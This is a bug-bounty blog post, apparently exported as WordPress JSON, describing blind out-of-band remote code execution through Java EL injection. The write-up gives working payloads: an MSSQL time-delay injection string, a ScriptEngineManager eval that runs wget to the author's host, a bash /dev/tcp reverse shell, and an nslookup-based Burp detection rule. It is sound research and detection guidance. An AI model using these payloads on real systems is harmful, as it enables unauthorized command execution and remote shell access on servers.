{"id":281,"date":"2019-07-27T17:57:52","date_gmt":"2019-07-27T14:57:52","guid":{"rendered":"https:\/\/xpoc.pro\/?p=281"},"modified":"2020-03-02T15:11:14","modified_gmt":"2020-03-02T13:11:14","slug":"out-of-band-rce-via-el-injection","status":"publish","type":"post","link":"https:\/\/xp.ht\/out-of-band-rce-via-el-injection\/","title":{"rendered":"Tricky out-of-band RCE via Java EL injection"},"content":{"rendered":"\n<p><div style=\"text-align:justify\"><p>It&#8217;s been a long period of silence here. I don&#8217;t blogging much nowadays, mostly because I can&#8217;t spend much time online due to health conditions and there was nothing special in my findings which could be worth a blogpost. I decided to write if there will be some unique or less documented behavior in my findings.<\/p><\/div><\/p>\n\n\n\n<!--more-->\n\n\n\n<div style=text-align:justify><p>So, it&#8217;s been a few days before the New Year (2019) when I was bored and decided to take a shot on the public bounty program (I didn&#8217;t get an approval for the full disclosure, only for limited, so I can&#8217;t name the target or more details). I already had some success with the program, finding a couple of SQLi\/SSRF on their assets. This time I found some unprotected directory with internal Android apps for employees, reported it and started exploring the apks (got permission from the team for this).<\/p>\n\n\n\n<p>I found some amount of medium-category bugs during research, such as hardcoded Gmail password and secrets in the .apk, Reflected XML XSS on the hidden public endpoint used by app, and more impactful such as msSQL Injection [very easy itself, was able to confirm it with simple &#8216;)%20waitfor%20delay&#8217;0%3a0%3a5&#8217;&#8211; but endpoint was hidden very well, only leak in the .apk helped to identify it]. Eventually, I came across the endpoint in .apk which had the next syntax:<\/p>\n\n\n\n<pre>https:\/\/subdomain.company.com\/aaa\/bbb\/?parameter=[32 hex chars]<\/pre>\n\n\n\n<p>There was no any output besides the error that parameter is wrong with HTTP code 403. Very often in such case, I&#8217;m starting to fuzz all the things so I started to play with the parameter. After some time, looking the results, I noticed interesting behavior: ${7*7} returned 500 error. It looked very promising so I started to do the generic Java EL Injection tests (I was pretty confident that backend runs Java so didn&#8217;t try other template injection tests first).<br><pre>${7*7} - 403<br>${2+2} - 403<br>${\"\"} - 403<br>${test}} - 500 (bad payload)<br><\/pre>So far so good. How about calling some method?<br><pre>${\"\".getClass()} - 404<\/pre><br>Wat. It&#8217;s something new! I was excited, but as appeared, there was a lot of pain and going the wrong direction ahead. I mistakenly thought that  ${&#8220;&#8221;.getClass()} worked, however it was not a case. As appeared after hours of trying different methods\/classes, I started from beginning and figured that ${7*7.1} returned the same 404 code. <br>I was disappointed a little and very close to accept this as false-positive but decided to continue on the next day.<\/p>\n\n\n\n<p>Next day, after some time of fuzzing and pain, I figured that there was a problem with dots processing apparently. With one more dot after } things returned back to normal:<br><pre>${\"\".getClass()}. - 403 HTTP code<\/pre><\/p>\n\n\n\n<p>Likely, application did some kind of splitting the parameter value using dots as delimiter, and processing the part before the last dot. I had no idea for what reason this was, but OK.<br>So I started to play with methods again:<br><pre>${\"\".getClass()}. - 403<br>${\"\".getClass().forName(\"java.lang.Runtime\")}. - 403<br>${\"\".getPotatoe().forName(\"java.lang.Runtime\")}. - 500<\/pre><\/p>\n\n\n\n<p>Okay, that was looking legit. To save the time for dear reader, I was unsuccessful with using  java.lang.Runtime directly for some reason (maybe because lack of proper knowledge?) and after hours of trying to use common ways to get RCE and reading numerous writeups about EL injections\/Spring SSTI bugs I ended up with the next payload:<br><pre>${\"\".getClass().forName(\"javax.script.ScriptEngineManager\").newInstance().getEngineByName(\"JavaScript\").eval('java.lang.Runtime.getRuntime().exec(\"wget%20http:\/\/myhost\")')}.<\/pre><br>It gave same 403 error, but I finally received pingback to my host, and as appeared, IP address of the request sender was different from the resource I tested. I came to the conclusion that original target I tested requested endpoint on some other internal server with parameter, and this endpoint appeared to be vulnerable. After that, I was able to establish reverse shell using next payload (it&#8217;s a bit weird, but it worked):\n<pre>${\"\".getClass().forName(\"javax.script.ScriptEngineManager\").newInstance().getEngineByName(\"JavaScript\").eval('proc=new java.lang.ProcessBuilder;proc.command(\"bash\", \"-c\", \"bash -i >&\/dev\/tcp\/ip\/8094 0>&1\");proc.start()')}.<\/pre>\n<\/p>\n\n\n\n<p class=\"has-text-align-center\"><img loading=\"lazy\" decoding=\"async\" width=\"1320\" height=\"747\" class=\"wp-image-548\" style=\"width: 680px;\" src=\"https:\/\/xpoc.pro\/wp-content\/uploads\/2019\/07\/test-3-1.png\" alt=\"\" srcset=\"https:\/\/xp.ht\/wp-content\/uploads\/2019\/07\/test-3-1.png 1320w, https:\/\/xp.ht\/wp-content\/uploads\/2019\/07\/test-3-1-300x170.png 300w, https:\/\/xp.ht\/wp-content\/uploads\/2019\/07\/test-3-1-1024x579.png 1024w, https:\/\/xp.ht\/wp-content\/uploads\/2019\/07\/test-3-1-768x435.png 768w\" sizes=\"(max-width: 1320px) 100vw, 1320px\" \/><\/p>\n\n\n\n<p>I built a payload for the Scan Check Builder Burp plugin ( I&#8217;m finding this plugin very useful for custom blind\/out-of-band vectors because of integrated Collaborator support) which can help to easily identify this type of Blind EL Injection during active scan. <\/p>\n\n\n\n<pre>${\"\".getClass().forName(\"javax.script.ScriptEngineManager\").newInstance().getEngineByName(\"JavaScript\").eval('java.lang.Runtime.getRuntime().exec(\"nslookup%20{BC}\")')}<\/pre>\n\n\n\n<p>During the endpoint scanning, {BC} will be automatically replaced by the Collaborator host. You can play with payload or add public ones, it can be shorter, or not using  javax.script.ScriptEngineManager at all (I just had most success with it, it worked already two times on different targets). Once Collaborator receive pingback, you will see the issue in your issues list:<\/p>\n\n\n\n<p><img loading=\"lazy\" decoding=\"async\" width=\"898\" height=\"121\" class=\"wp-image-451\" style=\"width: px;\" src=\"https:\/\/xpoc.pro\/wp-content\/uploads\/2018\/12\/test.png\" alt=\"\" srcset=\"https:\/\/xp.ht\/wp-content\/uploads\/2018\/12\/test.png 898w, https:\/\/xp.ht\/wp-content\/uploads\/2018\/12\/test-300x40.png 300w, https:\/\/xp.ht\/wp-content\/uploads\/2018\/12\/test-768x103.png 768w\" sizes=\"(max-width: 898px) 100vw, 898px\" \/><\/p>\n\n\n\n<p>Later I was able to uncover two  more RCEs in different programs (one case even didn&#8217;t react to the input at all, throwing 200OK all the time, but still had RCE behind the scenes) using custom scan rule.<\/p>\n\n\n\n<h4 class=\"wp-block-heading\">Lessons learned<\/h4>\n\n\n\n<p>1) With each step digging deeper into the scope chance to find something good increases dramatically. <br>2) Most interesting things often happen behind the scenes unnoticed. There should be a way to detect it, or even try!<br>3) If you faced with an interesting bug which isn&#8217;t unique for your target but was undetectable with automated tools &#8211; try to build the rule for both normal and blind\/OOB variations to detect it in future, even if the chance is small <\/p>\n","protected":false},"excerpt":{"rendered":"<p>It&#8217;s been a long period of silence here. I don&#8217;t blogging much nowadays, mostly because I can&#8217;t spend much time online due to health conditions and there was nothing special in my findings which could be worth a blogpost. I decided to write if there will be some unique or less documented behavior in my <a class=\"read-more\" href=\"https:\/\/xp.ht\/out-of-band-rce-via-el-injection\/\">&hellip;&nbsp;<span class=\"meta-nav\">&rarr;<\/span><\/a><\/p>\n","protected":false},"author":1,"featured_media":0,"comment_status":"closed","ping_status":"closed","sticky":false,"template":"","format":"standard","meta":{"footnotes":""},"categories":[2],"tags":[],"_links":{"self":[{"href":"https:\/\/xp.ht\/wp-json\/wp\/v2\/posts\/281"}],"collection":[{"href":"https:\/\/xp.ht\/wp-json\/wp\/v2\/posts"}],"about":[{"href":"https:\/\/xp.ht\/wp-json\/wp\/v2\/types\/post"}],"author":[{"embeddable":true,"href":"https:\/\/xp.ht\/wp-json\/wp\/v2\/users\/1"}],"replies":[{"embeddable":true,"href":"https:\/\/xp.ht\/wp-json\/wp\/v2\/comments?post=281"}],"version-history":[{"count":62,"href":"https:\/\/xp.ht\/wp-json\/wp\/v2\/posts\/281\/revisions"}],"predecessor-version":[{"id":625,"href":"https:\/\/xp.ht\/wp-json\/wp\/v2\/posts\/281\/revisions\/625"}],"wp:attachment":[{"href":"https:\/\/xp.ht\/wp-json\/wp\/v2\/media?parent=281"}],"wp:term":[{"taxonomy":"category","embeddable":true,"href":"https:\/\/xp.ht\/wp-json\/wp\/v2\/categories?post=281"},{"taxonomy":"post_tag","embeddable":true,"href":"https:\/\/xp.ht\/wp-json\/wp\/v2\/tags?post=281"}],"curies":[{"name":"wp","href":"https:\/\/api.w.org\/{rel}","templated":true}]}}